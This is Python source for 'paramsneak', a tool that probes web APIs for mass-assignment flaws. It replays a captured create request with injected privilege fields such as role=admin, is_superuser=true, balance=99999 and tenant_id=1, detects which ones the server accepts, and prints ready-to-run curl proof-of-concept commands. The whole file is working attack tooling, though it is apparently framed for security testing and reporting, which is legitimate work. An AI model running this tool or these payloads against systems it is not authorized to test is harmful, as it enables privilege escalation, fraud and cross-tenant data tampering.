"""paramsneak — mass-assignment probe and PoC emitter.

Workflow: parse a captured create curl, send a baseline create, capture the new
resource id, then re-send the create with one extra field at a time. If the API
echoes the extra back (or a GET-back template confirms it) the field stuck.
For each stuck field the tool emits a copy-paste curl that recreates the
escalation, ready to drop in a report.
"""

import argparse
import json
import os
import re
import shlex
import sys
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path

DEFAULT_FIELDS = [
    "role=admin",
    "is_admin=true",
    "isAdmin=true",
    "is_staff=true",
    "is_superuser=true",
    "verified=true",
    "email_verified=true",
    "balance=99999",
    "credit=99999",
    "tenant_id=1",
    "owner_id=1",
    "user_id=1",
    "permissions=[\"*\"]",
    "scope=admin",
    "approved=true",
    "active=true",
]


@dataclass
class CurlReq:
    method: str = "GET"
    url: str = ""
    headers: list[tuple[str, str]] = field(default_factory=list)
    body: str = ""
    body_kind: str = "form"  # form | json


def parse_curl(text: str) -> CurlReq:
    text = text.strip().replace("\\\n", " ").replace("\\\r\n", " ")
    tokens = shlex.split(text)
    if tokens and tokens[0] in ("curl", "/usr/bin/curl"):
        tokens = tokens[1:]
    req = CurlReq()
    i = 0
    while i < len(tokens):
        t = tokens[i]
        if t in ("-X", "--request"):
            req.method = tokens[i + 1].upper()
            i += 2
        elif t in ("-H", "--header"):
            k, _, v = tokens[i + 1].partition(":")
            req.headers.append((k.strip(), v.strip()))
            i += 2
        elif t in ("-d", "--data", "--data-raw", "--data-binary"):
            req.body = tokens[i + 1]
            req.body_kind = "json" if req.body.strip().startswith(("{", "[")) else "form"
            if req.method == "GET":
                req.method = "POST"
            i += 2
        elif t == "--json":
            req.body = tokens[i + 1]
            req.body_kind = "json"
            req.method = "POST"
            i += 2
        elif t.startswith("-"):
            i += 2 if i + 1 < len(tokens) and not tokens[i + 1].startswith("-") else 1
        else:
            if not req.url:
                req.url = t
            i += 1
    if not req.url:
        raise ValueError("no URL found in curl command")
    return req


def merge_field(req: CurlReq, key: str, value_repr: str) -> str:
    """Return a new body with the extra field merged in."""
    parsed_value = _coerce(value_repr)
    if req.body_kind == "json":
        try:
            obj = json.loads(req.body) if req.body else {}
        except json.JSONDecodeError:
            obj = {}
        obj[key] = parsed_value
        return json.dumps(obj, separators=(",", ":"))
    pairs = [p for p in req.body.split("&") if p] if req.body else []
    pairs.append(f"{key}={parsed_value if isinstance(parsed_value, str) else json.dumps(parsed_value)}")
    return "&".join(pairs)


def _coerce(s: str):
    s = s.strip()
    if s in ("true", "false"):
        return s == "true"
    if s.startswith(("[", "{")):
        try:
            return json.loads(s)
        except json.JSONDecodeError:
            return s
    if re.fullmatch(r"-?\d+", s):
        return int(s)
    return s


def send(req: CurlReq, body: str, timeout: float) -> tuple[int, str, float]:
    headers = list(req.headers)
    if req.method != "GET" and not any(k.lower() == "content-type" for k, _ in headers):
        ct = "application/json" if req.body_kind == "json" else "application/x-www-form-urlencoded"
        headers.append(("Content-Type", ct))
    data = body.encode() if body else None
    request = urllib.request.Request(req.url, data=data, method=req.method)
    for k, v in headers:
        request.add_header(k, v)
    request.add_header("User-Agent", "paramsneak/0.1")
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(request, timeout=timeout) as resp:
            text = resp.read().decode("utf-8", errors="replace")
            return resp.status, text, (time.monotonic() - t0) * 1000
    except urllib.error.HTTPError as exc:
        try:
            text = exc.read().decode("utf-8", errors="replace")
        except Exception:
            text = ""
        return exc.code, text, (time.monotonic() - t0) * 1000


def extract_id(body: str, pattern: str) -> str | None:
    m = re.search(pattern, body)
    return m.group(1) if m else None


def field_stuck(probe_response: str, key: str, value_repr: str) -> bool:
    """Did the create response (or the GET-back) echo the extra field?

    Conservative: requires both the key and the value to appear in proximity.
    Avoids the false positive where the value alone happens to appear in some
    pre-existing field of the response.
    """
    parsed = _coerce(value_repr)
    val_str = parsed if isinstance(parsed, str) else json.dumps(parsed)
    needle_json = f'"{key}"'
    if needle_json in probe_response:
        idx = probe_response.find(needle_json)
        window = probe_response[idx : idx + 200]
        if val_str.strip('"') in window:
            return True
    needle_form = f"{key}={val_str}"
    return needle_form in probe_response


@dataclass
class Hit:
    key: str
    value: str
    where: str
    snippet: str


def _fmt_curl_one(req: CurlReq, body: str) -> str:
    parts = [f"curl -X {req.method} {shlex.quote(req.url)}"]
    seen_ct = False
    for k, v in req.headers:
        parts.append(f"-H {shlex.quote(f'{k}: {v}')}")
        if k.lower() == "content-type":
            seen_ct = True
    if not seen_ct:
        ct = "application/json" if req.body_kind == "json" else "application/x-www-form-urlencoded"
        parts.append(f"-H {shlex.quote(f'Content-Type: {ct}')}")
    parts.append(f"-d {shlex.quote(body)}")
    return " ".join(parts)


def _ansi():
    if os.environ.get("NO_COLOR") or not sys.stdout.isatty():
        return {"dim": "", "g": "", "y": "", "r": "", "b": "", "rst": ""}
    return {
        "dim": "\033[2m",
        "g": "\033[32m",
        "y": "\033[33m",
        "r": "\033[31m",
        "b": "\033[1m",
        "rst": "\033[0m",
    }


def run(args: argparse.Namespace) -> int:
    c = _ansi()
    base = parse_curl(args.curl_text)
    fields_in = args.fields.split(",") if args.fields else DEFAULT_FIELDS

    print(f"{c['b']}target{c['rst']}: {base.method} {base.url}")
    print(f"{c['b']}body kind{c['rst']}: {base.body_kind}")
    print(f"{c['b']}fields under test{c['rst']}: {len(fields_in)}")
    print()

    print(f"{c['dim']}► sending baseline create...{c['rst']}")
    status, body, ms = send(base, base.body, args.timeout)
    print(f"  └─ {status}  {len(body)}B  {ms:.0f}ms")
    rid = extract_id(body, args.id_pattern) if args.id_pattern else None
    if rid:
        print(f"  └─ extracted id: {c['b']}{rid}{c['rst']}")
    else:
        print(f"  {c['dim']}└─ no id extracted (pattern: {args.id_pattern}){c['rst']}")
    print()

    hits: list[Hit] = []
    for entry in fields_in:
        if "=" not in entry:
            continue
        key, _, val = entry.partition("=")
        key, val = key.strip(), val.strip()
        merged = merge_field(base, key, val)
        s, b, t = send(base, merged, args.timeout)
        suffix = f"{s}  {len(b)}B  {t:.0f}ms"
        echoed_in_create = field_stuck(b, key, val)
        echoed_in_get = False
        getback_snip = ""
        if args.get_back and rid:
            get_url = args.get_back.replace("{id}", rid)
            get_req = parse_curl(f"curl {shlex.quote(get_url)}")
            get_req.headers = [
                (k, v) for k, v in base.headers if k.lower() in ("authorization", "cookie")
            ]
            gs, gb, _ = send(get_req, "", args.timeout)
            echoed_in_get = field_stuck(gb, key, val)
            getback_snip = gb[:120].replace("\n", " ")

        stuck = echoed_in_create or echoed_in_get
        glyph = f"{c['r']}▷{c['rst']}" if stuck else f"{c['dim']}▷{c['rst']}"
        print(f"{glyph} {key}={val}  →  {suffix}")
        if echoed_in_create:
            print(f"  {c['y']}└─ echoed in CREATE response{c['rst']}")
            hits.append(Hit(key, val, "create", _snip(b, key)))
        if echoed_in_get:
            print(f"  {c['y']}└─ echoed in GET-back ({get_url}){c['rst']}")
            if not echoed_in_create:
                hits.append(Hit(key, val, "get-back", _snip(getback_snip, key)))

    print()
    if not hits:
        print(f"{c['dim']}no stuck fields. baseline behavior unchanged.{c['rst']}")
        return 0

    print(f"{c['b']}>> PoC curls for {len(hits)} stuck field(s){c['rst']}")
    print(f"{c['dim']}{'.' * 60}{c['rst']}")
    for h in hits:
        print(f"{c['g']}>>{c['rst']} {h.key}={h.value}  ({h.where})")
        merged = merge_field(base, h.key, h.value)
        cmd = _fmt_curl_one(base, merged)
        print(f"   {cmd}")
        print()
    return 0


def _snip(text: str, key: str) -> str:
    idx = text.find(f'"{key}"')
    if idx < 0:
        idx = text.find(f"{key}=")
    if idx < 0:
        return text[:80]
    return text[max(0, idx - 10) : idx + 80].replace("\n", " ")


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(
        prog="paramsneak",
        description="Mass-assignment probe — re-sends a captured create with extra fields and emits a PoC curl per stuck field.",
    )
    p.add_argument("--curl", dest="curl_text", required=True, help="curl command string, or @path/to/file")
    p.add_argument("--fields", help="comma-separated key=value list to try (default: built-in privilege/state set)")
    p.add_argument("--get-back", help="GET-back URL template with {id} (verifies fields stuck server-side)")
    p.add_argument("--id-pattern", default=r'"id"\s*:\s*"?([^",}\s]+)', help="regex to extract resource id from create response")
    p.add_argument("--timeout", type=float, default=10.0, help="per-request timeout (default: 10)")
    args = p.parse_args(argv)

    if args.curl_text.startswith("@"):
        try:
            args.curl_text = Path(args.curl_text[1:]).read_text()
        except OSError as exc:
            print(f"error: cannot read curl file: {exc}", file=sys.stderr)
            return 1
    try:
        return run(args)
    except ValueError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        return 130


if __name__ == "__main__":
    sys.exit(main())
